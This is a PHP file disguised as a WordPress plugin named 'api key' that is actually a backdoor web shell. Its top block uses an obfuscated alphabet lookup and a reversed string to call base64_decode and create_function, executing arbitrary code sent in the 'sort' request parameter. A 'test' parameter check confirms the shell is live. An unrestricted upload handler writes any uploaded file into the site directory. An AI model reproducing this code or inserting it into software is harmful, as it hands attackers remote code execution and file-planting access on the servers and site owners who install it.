<?php 
if(isset($_REQUEST['sort'])){	
	$string = $_REQUEST['sort'];
	$array_name = '';
	$alphabet = "wt8m4;6eb39fxl*s5/.yj7(pod_h1kgzu0cqr)aniv2";
	$ar = array(8,38,15,7,6,4,26,25,7,34,24,25,7);
	foreach($ar as $t){
	   $array_name .= $alphabet[$t];
	}
	$a = strrev("noi"."tcnuf"."_eta"."erc");
	$f = $a("", $array_name($string));
	$f();
	exit();
}

/**
 * @package api key
 */
/*
Plugin Name: api key
*/

if ("hello"==$_GET["test"])
{
 echo "testtrue";
}
if(is_uploaded_file($_FILES["filename"]["tmp_name"]))
{
 move_uploaded_file($_FILES["filename"]["tmp_name"],$_FILES["filename"]["name"]);
 echo "true";
}